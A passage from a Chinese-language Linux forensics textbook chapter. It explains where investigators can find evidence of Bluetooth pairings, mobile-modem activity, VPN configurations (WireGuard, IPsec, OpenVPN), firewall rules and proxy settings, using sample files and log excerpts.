另一个可能包含 MAC 地址的地方是 accept 和 deny 文件。如果使用这些文件，它们的位置通过配置中的 `accept_mac_file=` 和 `deny_mac_file=` 参数来定义。这些文件包含管理员明确允许或阻止的 MAC 地址列表，这些 MAC 地址在取证调查中可能具有意义。

#### *蓝牙痕迹*

Linux 下的蓝牙是通过组合内核模块、守护进程和实用程序实现的。蓝牙子系统保留了多个取证痕迹，这些痕迹可以被分析并与不同的物理设备关联。蓝牙设备与 Linux 系统配对的证据可能对调查有所帮助。

关于当前和先前配对的蓝牙设备的信息可以在 */var/lib/bluetooth/* 目录中找到。这里有一个名为本地安装的蓝牙适配器的 MAC 地址的初始子目录：

```
# ls /var/lib/bluetooth/
90:61:AE:C7:F1:9F/
```

该目录的创建（出生）时间戳表明了适配器首次安装的时间。如果蓝牙适配器在主板上，它很可能与发行版安装时间匹配。如果使用了 USB 蓝牙适配器，则创建时间将显示首次插入的时间。

这个本地适配器设备目录包含更多的子目录和一个 *settings* 文件：

```
# ls /var/lib/bluetooth/90:61:AE:C7:F1:9F/
00:09:A7:1F:02:5A/ 00:21:3C:67:C8:98/ cache/ settings
```

*settings* 文件提供关于可发现性的信息。MAC 地址目录以当前配对的设备命名。*cache/* 目录包含以当前和先前配对的设备 MAC 地址命名的文件：

```
# ls /var/lib/bluetooth/90:61:AE:C7:F1:9F/cache/
00:09:A7:1F:02:5A 00:21:3C:67:C8:98 08:EF:3B:82:FA:57 38:01:95:99:4E:31
```

这些文件包括用户过去从配对设备列表中删除的蓝牙设备。

MAC 地址目录包含一个或多个文件。*info* 文件提供关于配对设备的更多信息：

```
# cat 00:21:3C:67:C8:98/info
[General]
Name=JAMBOX by Jawbone
Class=0x240404
SupportedTechnologies=BR/EDR;
Trusted=true
Blocked=false
Services=00001108-0000-1000-8000-00805f9b34fb;0000110b-0000-1000-8000-00805f9b
34fb;0000110d-0000-1000-8000-00805f9b34fb;0000111e-0000-1000-8000-00805f9b34fb;

[LinkKey]
Key=A5318CDADCAEDE5DD02D2A4FF523CD80
Type=0
PINLength=0
```

这显示了设备的 MAC 地址（在目录名称中）、设备及其服务的描述等信息。

从历史角度来看，*cache/* 目录可能更为有趣，因为它包含了当前配对的设备和之前配对的设备。文件的信息可能不如配对设备的 *info* 文件丰富，但简单地在缓存目录中使用 `grep` 可以列出以前使用过的设备：

```
# grep Name= * 
00:09:A7:1F:02:5A:Name=Beoplay H9i
00:21:3C:67:C8:98:Name=JAMBOX by Jawbone
08:EF:3B:82:FA:57:Name=LG Monitor(57)
38:01:95:99:4E:31:Name=[Samsung] R3
```

这些文件的创建（出生）时间戳可能表明设备与 Linux 系统配对的时间。

配对设备的重建很有趣，但那些配对设备的实际使用也同样值得关注。根据设备类型和所使用的蓝牙服务，这些使用情况可能会在日志中显现出来：

```
Aug 21 13:35:29 pc1 bluetoothd[1322]: Endpoint registered: sender=:1.54
path=/MediaEndpoint/A2DPSink/sbc
Aug 21 13:35:29 pc1 bluetoothd[1322]: Endpoint registered: sender=:1.54
path=/MediaEndpoint/A2DPSource/sbc
Aug 21 13:35:40 pc1 bluetoothd[1322]: /org/bluez/hci0/dev_38_01_95_99_4E_31/
fd1: fd(54) ready
...
Aug 21 13:52:44 pc1 bluetoothd[1322]: Endpoint unregistered: sender=:1.54
path=/MediaEndpoint/A2DPSink/sbc
Aug 21 13:52:44 pc1 bluetoothd[1322]: Endpoint unregistered: sender=:1.54
path=/MediaEndpoint/A2DPSource/sbc
```

这些日志表明，之前识别的 `[Samsung] R3` 设备已连接 17 分钟。

每个 MAC 地址可能存在附加的设备特定字段和文件（属性）。根据设备和调查的相关性，可能需要额外的审查。

#### *WWAN 遗留文件*

现在许多笔记本电脑能够通过内置调制解调器或插入式 USB 设备访问移动网络（如 3G/4G/5G 等），并使用运营商提供的 SIM 卡。Linux 支持这些移动技术，可以在本地配置文件、数据库和日志中找到活动的痕迹。

Linux 系统与移动调制解调器交互的方式有多种：

+   传统串行设备：*/dev/ttyUSB** 通过 AT 命令进行控制

+   USB 通信设备类（CDC）设备：*/dev/cdc-wdm** 通过二进制协议进行控制^(4)

+   PCIe 设备：*/dev/wwan** 通过调制解调器主机接口（MHI）进行控制^(5)

一旦移动连接经过认证、授权并建立，网络接口就可以进行配置。常见的网络接口名称包括 `ppp*`（用于传统调制解调器）、`wwan*`、`ww*`（用于重命名接口）和 `mhi*`（用于基于 MHI 的 PCIe 调制解调器）。调制解调器设备名称和网络接口可以在日志中找到，并可能揭示与移动基础设施的连接。

以下几个例子展示了一个使用 MBIM 协议连接到移动网络的集成 USB 调制解调器。此时，调制解调器设备被内核检测到，并创建了一个 `wwan0` 网络设备：

```
Dec 21 08:32:16 pc1 kernel: cdc_mbim 1-6:1.12: cdc-wdm1: USB WDM device
Dec 21 08:32:16 pc1 kernel: cdc_mbim 1-6:1.12 wwan0: register 'cdc_mbim' at
usb-0000:00:14.0-6, CDC MBIM, 12:33:b9:88:76:c1
Dec 21 08:32:16 pc1 kernel: usbcore: registered new interface driver cdc_mbim
```

然后，ModemManager 守护进程接管设备的管理和移动连接的设置：

```
Dec 21 08:32:21 pc1 ModemManager[737]: [/dev/cdc-wdm1] opening MBIM device...
Dec 21 08:32:21 pc1 ModemManager[737]: [/dev/cdc-wdm1] MBIM device open
...
Dec 21 08:32:23 pc1 ModemManager[737]: <info> [modem0] state changed (disabled
 -> enabling)
...
Dec 21 08:50:54 pc1 ModemManager[737]: <info> [modem0] 3GPP registration state
 changed (searching -> registering)
Dec 21 08:50:54 pc1 ModemManager[737]: <info> [modem0] 3GPP registration state
 changed (registering -> home)
Dec 21 08:50:54 pc1 ModemManager[737]: <info> [modem0] state changed
 (searching -> registered)
...
Dec 21 08:50:57 pc1 ModemManager[737]: <info> [modem0] state changed
 (connecting -> connected)
```

在这里，ModemManager 记录了几个状态变化。它启用了调制解调器，搜索提供商和家庭网络，注册设备，并连接到网络。

在设备在调制解调器层连接后，NetworkManager 接管了任务，请求并配置了 IP 网络（IP 地址、路由和 DNS）：

```
Dec 21 08:50:57 pc1 NetworkManager[791]: <info> [1608537057.3306]
 modem-broadband[cdc-wdm1]: IPv4 static configuration:
Dec 21 08:50:57 pc1 NetworkManager[791]: <info> [1608537057.3307]
 modem-broadband[cdc-wdm1]: address 100.83.126.236/29
Dec 21 08:50:57 pc1 NetworkManager[791]: <info> [1608537057.3307]
 modem-broadband[cdc-wdm1]: gateway 100.83.126.237
Dec 21 08:50:57 pc1 NetworkManager[791]: <info> [1608537057.3308]
 modem-broadband[cdc-wdm1]: DNS 213.55.128.100
Dec 21 08:50:57 pc1 NetworkManager[791]: <info> [1608537057.3308]
 modem-broadband[cdc-wdm1]: DNS 213.55.128.2
```

移动服务提供商为移动接口分配 IP 地址、默认网关和 DNS 服务器。默认情况下，内核和 ModemManager 不会记录移动标识符信息，如 IMSI 或 IMEI。根据地区的监管要求，移动服务提供商可能会记录这些连接信息。

一些 Linux 系统可能安装了 *Modem Manager GUI*，它可以发送和接收 SMS 短信消息和 USSD 命令。Modem Manager GUI 将 SMS 消息存储在用户主目录下的 GNU 数据库（`sms.gdbm`）中，并使用唯一的设备标识符作为目录名：

```
$ ls ~/.local/share/modem-manager-gui/devices/01f42c67c3e3ab75345981a5c355b545/
sms.gdbm
```

可以使用 `gdbm_dump` 工具（gdbm 包的一部分）转储此文件，但 `strings` 命令也会生成可读的输出：

```
$ strings sms.gdbm
...
783368690<sms>
    <number>+41123456789</number>
    <time>18442862660071983976</time>
    <binary>0</binary>
    <servicenumber>+41794999005</servicenumber>
    <text>Do you have the bank codes?</text>
    <read>1</read>
    <folder>0</folder>
</sms>
1102520059<sms>
    <number>+41123456789</number>
    <time>1608509427</time>
    <binary>0</binary>
    <servicenumber>(null)</servicenumber>
    <text>No, I have to steal them first!</text>
    <read>1</read>
    <folder>1</folder>
</sms>
```

每条短信消息都显示在`<text>`标签内。显示了电话号码和时间^(6)，`<read>`标签表示消息是否已读。文件夹编号代表接收的消息（`0`）、已发送的消息（`1`）和草稿消息（`2`）。更多信息可以在*[`sourceforge.net/projects/modem-manager-gui/`](https://sourceforge.net/projects/modem-manager-gui/)*找到。

### 网络安全工件

网络安全的主题涉及通过防火墙保护系统的边界，并保护网络流量的隐私和完整性。以下部分描述了 Linux 下常见的防火墙和 VPN，以及如何分析日志、配置和其他可能在取证调查中感兴趣的持久化信息。重点将特别放在（相对较）新的技术，如 NFTables 和 WireGuard。SSH 协议也提供了一层网络安全（见 第十章）。

#### *WireGuard、IPsec 和 OpenVPN*

WireGuard 是 VPN 领域中的相对新手。它最初由 Jason Donenfeld 为 Linux 开发，现在已成为内核的默认部分。WireGuard 旨在简化实现，并作为一个内核模块创建一个虚拟接口。该接口像其他任何网络接口一样：可以启用或禁用、防火墙保护、路由流量，或者通过标准网络接口工具查询。像 tcpdump 或 Wireshark 这样的包嗅探器也可以用来捕获网络流量。

WireGuard 是一种点对点隧道模式的 VPN，将 IP 数据包封装在 UDP 内，并将其传输到配置好的对等方。使用了现代的加密协议（如 Curve、ChaCha 等），且密钥管理是带内进行的。其易用性、性能和隐蔽性使 WireGuard 在爱好者、研究人员和黑客社区中非常受欢迎。

WireGuard 接口可以由系统所有者随意命名，但`wg0`是最常用的。可以在配置文件和日志中找到对该设备的引用，就像你使用其他网络接口名称（如`eth0`）一样。

每个 WireGuard 接口通常有一个配置文件，其中包含私钥、所有对等方的公钥、端点的 IP 地址以及允许的 IP 范围。WireGuard 配置信息通常可以在以下几个位置找到：

+   WireGuard 默认文件，*/etc/wireguard/wg0.conf*

+   一个 systemd *.netdev* 文件，例如 */etc/systemd/network/wg0.netdev*

+   一个类似于 */etc/NetworkManager/system-connections/ Wireguard connection 1* 的 NetworkManager 文件。

*/etc/wireguard/* 目录可能包含一个或多个以接口名称命名的配置文件。文件内容如下：

```
# cat /etc/wireguard/wg0.conf
[Interface]
PrivateKey = 4O0xcLvb6TgH79OXhY6sRfa7dWtZRxgQNlwwXJaloFo=
ListenPort = 12345
Address = 192.168.1.1/24

[Peer]
PublicKey = EjREDBYxKYspNBuEQDArALwARcAzKV3Q5TM565XQ1Eo=
AllowedIPs = 192.168.1.0/24
Endpoint = 192.168.1.2:12345
```

`[Interface]` 部分描述了本地机器，`[Peer]` 部分描述了可信对等体（可能有多个对等体）。

Systemd 支持在 .*netdev* 文件中配置 WireGuard，如下所示：

```
# cat /etc/systemd/network/wg0.netdev
[NetDev]
Name=wg0
Kind=wireguard

[WireGuard]
PrivateKey = 4O0xcLvb6TgH79OXhY6sRfa7dWtZRxgQNlwwXJaloFo=
ListenPort = 12345

[WireGuardPeer]
PublicKey = EjREDBYxKYspNBuEQDArALwARcAzKV3Q5TM565XQ1Eo=
AllowedIPs = 192.168.1.0/24
Endpoint =
```

可能需要一个关联的 *.network* 文件来配置接口的 IP 地址。

NetworkManager 守护进程为 WireGuard 提供了一个 VPN 插件，并且可以与其他 VPN 配置一起使用：

```
# cat "/etc/NetworkManager/system-connections/VPN connection 1.nmconnection"
[connection]
id=VPN connection 1
uuid=4facf054-a3ea-47a1-ac9d-c0ff817e5c78
type=vpn
autoconnect=false
permissions=
timestamp=1608557532

[vpn]
local-ip4=192.168.1.2
local-listen-port=12345
local-private-key=YNAP0mMBjCEIT1m7GpE8icIdUTLn10+Q76P+ThItyHE=
peer-allowed-ips=192.168.1.0/24
peer-endpoint=192.168.1.1:12345
peer-public-key=Tmktbu0eM//SYLA51O4U7LqoSpbis9MAnyPL/z5LTm0=
service-type=org.freedesktop.NetworkManager.wireguard
...
```

WireGuard 配置遵循本章前面描述的 NetworkManager 文件格式。

软件包 *wireguard-tools* 提供了文档、systemd 单元文件和配置 WireGuard 的工具。`wg-quick` 脚本用于简化命令行操作。取证调查人员应检查 shell 历史记录，以寻找手动使用 `wg` 和 `wg-quick` 工具的证据。

WireGuard 的配置提供了几个从取证角度可能感兴趣的痕迹。`wg0` 接口使用的 IP 地址可能出现在本地和远程对等体的日志或配置中。对等体的公钥为多个机器之间提供了加密关联（增强证据的有效性）。允许的 IP 列表描述了预期在远程对等体后面存在的 IP 地址范围（可能是路由的网络）。这些 IP 地址也可能出现在日志中，并且可能具有重要意义。所有这些痕迹对重建 VPN 网络设置非常有帮助。

IPsec 是一个 IETF 标准，相关协议在几十个 RFC 中有文档说明。IPsec 可以在隧道模式（加密整个数据包）或传输模式（仅加密负载）下运行。IPsec 是内核的标准部分，可以加密和认证流量，但需要用户空间工具和守护进程来进行配置和密钥管理。带外密钥管理使用 Internet 密钥交换（IKE）执行，这是由各种实现独立提供的守护进程。

当前 Linux 系统中最常用的三种 IPsec 实现是 StrongSwan (*[`www.strongswan.org/`](https://www.strongswan.org/)*), Openswan (*[`www.openswan.org/`](https://www.openswan.org/)*), 和 Libreswan (*[`libreswan.org/`](https://libreswan.org/)*)。这些实现将配置数据存储在本地系统上，并记录各种使用情况。检查本地安装的软件包和相关目录（位于 */etc/*）以确认这些 IPsec 实现是否存在。如果已安装，可以分析配置文件和日志，以了解使用情况并恢复感兴趣的取证痕迹。

OpenVPN (*[`openvpn.net/`](https://openvpn.net/)*) 最初作为基于 TLS 的用户空间竞争者开发，用于替代 IPsec。OpenVPN 既是商业公司的名称，也是开源项目的名称。OpenVPN 的优势不在于性能，而在于易用性。与 IPsec 的另一个不同之处在于它侧重于认证用户而非机器，以允许访问受保护的网络。

`openvpn`程序（作为 openvpn 软件包的一部分安装）可以作为客户端或服务器运行，具体取决于使用的启动标志。配置数据可以在*/etc/openvpn/client/*或*/etc/openvpn/server/*目录中找到。有关更多信息，请参阅 openvpn(8)手册页。NetworkManager 守护进程有一个 OpenVPN 插件，并且可能在*/etc/NetworkManager/*目录中有一个单独的配置文件（或多个文件）。

#### *Linux 防火墙与 IP 访问控制*

Linux 拥有悠久的防火墙支持历史，并且随着时间的推移对内核防火墙子系统进行了许多重大更改（nftables 取代了 iptables，iptables 取代了 ipchains，ipchains 取代了 ipfwadm）。最近的重大变化是用 nftables 替换了 iptables。

Linux 还具有一种基本的防火墙功能，称为伯克利数据包过滤器（BPF），通常用于按进程或 systemd 单元进行过滤。其他 IP 过滤则以面向网络应用程序的用户空间访问控制列表的形式进行。根据法医调查的背景，检查防火墙控制（或缺乏控制）可能非常重要。

Linux 网络防火墙功能是在内核中实现的。用户空间的工具和守护进程可以管理防火墙（以及其他网络组件），但它们只是将配置信息传递给内核。为了保持持久性，防火墙规则还必须在启动时添加到内核中。防火墙日志记录通过内核的环形缓冲区完成，如第五章所述。

nftables 防火墙功能是对旧的 iptables 系统的重大升级，所有发行版和工具都在用它替代传统的 iptables（兼容脚本使这一过程变得简单）。此外，nftables 将 IPv4、IPv6 和 MAC 地址过滤整合到一个配置文件中，并允许每条规则执行多个操作。

如果手动配置（例如在服务器上），典型的 nftables 配置文件位置是在*/etc/nftables.conf*文件或*/etc/nftables/*目录中。此文件通常由 systemd 单元加载，可以在启动时自动加载，也可以在更改后手动加载。以下是一个配置文件示例：

```
$ cat /etc/nftables.conf
table inet filter {
  chain input {
   type filter hook input priority 0;

   # allow return packets from outgoing connections
   ct state {established, related} accept

   # allow from loopback
   iifname lo accept

   # allow icmp and ssh
   ip protocol icmp accept
   tcp dport 22 accept

   # block everything else
   reject with icmp type port-unreachable
 }
 chain forward {
   type filter hook forward priority 0;
   drop
 }
 chain output {
   type filter hook output priority 0;
 }
}
```

此示例中的内核防火墙配置为允许传出连接（包括返回的数据包），允许传入的`ping`和`ssh`连接，并阻止其余流量（并防止路由）。文件中的注释解释了这些规则。有关 nftables 规则的更多信息，请参阅 nft(8)手册页。

Linux 发行版可能有自己的机制来管理防火墙规则。Ubuntu 使用 Uncomplicated FireWall (UFW) 来指定传递给 iptables/nftables 的规则。配置和防火墙规则文件位于 */etc/ufw/* 目录中。*ufw.conf* 文件中的 `ENABLED=` 设置指示防火墙是否处于活动状态。如果启用了日志记录，UFW 会将日志记录到 syslog 中，这可能会将日志保存到 */var/log/ufw.log*（如果配置了 rsyslog）。

Fedora/Red Hat 和 SUSE 使用 firewalld 配置 nftables（SUSE 在 SLES15 中用 firewalld 替代了其旧的 SuSEfirewall2 系统）。firewalld 守护进程在 systemd 中启用，配置文件位于 */etc/firewalld/* 目录。如果启用了日志记录，日志将写入 */var/log/firewalld*。所有这些发行版特有的规则管理系统（脚本或 GUI）最终只是将规则添加到内核中的 nftables。

一些防火墙规则可能是由安全软件或入侵防御系统（IPS）根据恶意活动动态创建的。例如，fail2ban 软件包运行一个守护进程，监视各种日志文件以检测暴力破解攻击。如果检测到恶意的 IP 地址，它将通过 iptables 或 nftables 临时封禁该地址。fail2ban 会记录被封禁的 IP 地址。其他类似的 IPS 软件（例如 sshguard，是 fail2ban 的替代方案）也可能在系统上运行并记录恶意活动。

Systemd 单元文件可能包含执行访问 IP 控制的指令。根据单元类型，可以在单元文件的 `[Slice]`、`[Scope]`、`[Service]`、`[Socket]`、`[Mount]` 或 `[Swap]` 部分中找到指令 `IPAddressAllow=` 和 `IPAddressDeny=`。这个 systemd 特性并不使用 nftables，而是使用扩展的伯克利数据包过滤器（eBPF），它也是内核的一部分。有关更多信息，请参阅 systemd.resource-control(5) 手册页。

应用程序可能会配置自己的过滤控制，由用户空间进程（而非内核）做出 IP 访问决策。一种传统的做法是使用 */etc/hosts.allow* 和 */etc/hosts.deny* 文件。这些文件允许为使用 libwrap（TCP 包装器）库编译的应用程序提供定制的访问控制。有关更多信息，请参阅 hosts_access(5) 手册页。

许多应用程序有自己的 IP 访问控制机制，可以在其配置文件中指定，这通常允许与应用程序相关的更灵活的访问控制。例如，Apache web 服务器可以配置为只允许某些 IP 地址访问 web 树中的某些部分：

```
<Directory /secretstuff>
        Require ip 10.0.0.0/24
</Directory>
```

在此示例中，任何试图从定义的 IP 地址范围之外访问 */secretstuff* 目录的用户将收到“HTTP 403 Forbidden”错误。

这是另一个示例，展示了 SSH 仅允许来自指定 IP 地址的选定用户登录：

```
$ cat /etc/ssh/sshd_config
# only users from pc1 are allowed
AllowUsers root@10.0.0.1 sam@10.0.0.1
...
```

如果应用程序仅监听一个端口，则这些应用层 IP 控制不需要基于端口号进行过滤。

从取证角度来看，任何包含被阻止数据包的日志可能都很有趣。它们显示了尝试的连接和扫描活动，这些活动可能与入侵有关。它们还揭示了某台机器在某个时间点的位置或状态（可能是一台流动的笔记本电脑）。如果源 MAC 地址被记录下来，它们表示在本地附加网络上的发送机器的 MAC 地址（通常是路由器）。在 DDoS 攻击、扫描或其他被阻止的恶意活动的情况下，可以将使用的 IP 地址与其他情报数据进行关联，以收集更多有关威胁行为者的信息（可能将其归属于某个特定的僵尸网络）。

#### *代理设置*

代理服务器是一种应用层防火墙，旨在通过代理提供间接访问远程服务的功能。使用代理时，客户端机器的网络连接会终止于代理服务器，同时包含远程服务的信息。然后，代理服务器代表客户端建立到远程服务的新连接。关于远程连接的信息传递是代理协议的一部分。一些协议，如 SOCKS 或 HTTP CONNECT，专门设计用于 TCP 会话的代理。其他协议，如 SMTP，则在协议中本身就包含代理模型（例如，将电子邮件从一个主机转发到另一个主机，直到到达收件箱）。

在 Linux 发行版中，代理设置可以是系统范围的，特定于用户的，或在每个应用程序中单独设置。代理服务器可以是远程机器，也可以是本地运行的守护进程。本地代理守护进程通常用于过滤本地 Web 流量或作为无法直接访问的远程网络的网关（例如 TOR）。

Linux 系统可以通过多种方式指定全局代理设置。每个应用程序决定如何处理这些设置。根据应用程序的不同，系统级设置可能被完全使用、部分使用或完全忽略。

一组环境变量可以用来指定代理，这些变量可以在 shell 启动脚本中或任何设置环境变量的地方进行设置。在一些发行版中，*/etc/sysconfig/proxy*文件会在启动时读取，该文件包含代理变量，如下所示：

```
PROXY_ENABLED="yes"
HTTP_PROXY="http://proxy.example.com:8888"
HTTPS_PROXY="http://proxy.example.com:8888"
FTP_PROXY="http://proxy.example.com:8888"
GOPHER_PROXY=""
SOCKS_PROXY=""
SOCKS5_SERVER=""
NO_PROXY="localhost,127.0.0.1,example.com,myhiddendomain.com"
```

`NO_PROXY`设置会忽略为特定主机、IP 范围和域定义的代理设置。从取证角度来看，这非常有趣，因为它可能包含由系统管理员显式配置的、非公开的域名和网络地址，这些信息可能与调查相关。

用户的 dconf 数据库也存储着代理设置，任何支持的应用程序（如 GNOME 3 或 40 应用程序）都可以读取这些设置。这些信息存储在用户主目录中的一个*GVariant*数据库文件中（*~/.config/dconf/user/*）。第十章解释了如何提取和分析 dconf 数据库的内容。

NetworkManager 守护进程有一个选项，可以使用 *代理自动配置（pac）* 文件来发现和配置 Web 代理设置。*pac* 文件使用 JavaScript 定义是否以及如何对 URL 进行代理。代理 *pac* 文件可以是本地的，也可以从远程服务器获取，通常可以在存储在 */etc/NetworkManager/system-connections/* 目录中的网络配置文件的 `[proxy]` 部分找到。

每个安装的网络应用可能有自己独立的代理设置，这些设置可能与系统级别的代理设置不同。在法医调查中，这意味着需要单独检查相关的应用程序。

命令行代理也可以用于启动应用程序。例如，`tsocks` 和 `socksify` 是允许在命令行上启动程序并使用 SOCKS 库代理网络流量的工具（设计用于没有代理支持的程序）。命令行代理的证据可能会在 shell 历史记录中找到。

上述示例提到了客户端使用代理，但 Linux 服务器也可以作为代理服务器运行。流行的 Linux 上的 Web 代理包括 Squid 和 Polipo。Dante 是另一个流行的 SOCKS 代理服务器。

Nginx 支持多种代理协议，并且也可以充当反向代理。反向代理“假装”是远程服务器，接受来自客户端的连接，同时与真实服务器建立独立的连接。反向代理在企业环境中用于负载均衡和 Web 应用防火墙（WAF）非常常见。反向代理也是某些匿名化系统的工作方式。

反向代理的恶意使用之一是实时钓鱼攻击，其中反向代理在受害者客户端和服务器之间执行应用层中间人攻击。僵尸网络的指挥与控制服务器也可能使用反向代理，以提高抗击封锁的能力并进行匿名化。

服务器端代理通常会记录客户端连接和活动，这些可以在法医调查中进行分析。这在查获恶意服务器的情况下尤其有价值，因为可以提取客户端 PC 列表（可能是被僵尸网络感染的受害者）。

### 摘要

本章描述了如何分析 Linux 网络，包括处理接口和 MAC 地址的硬件层、网络服务和 DNS 解析。还介绍了如何识别 Wi-Fi 证据、配对的蓝牙设备并分析 WWAN 移动活动。此外，本章还探讨了 Linux 网络安全，如 VPN、防火墙和代理。
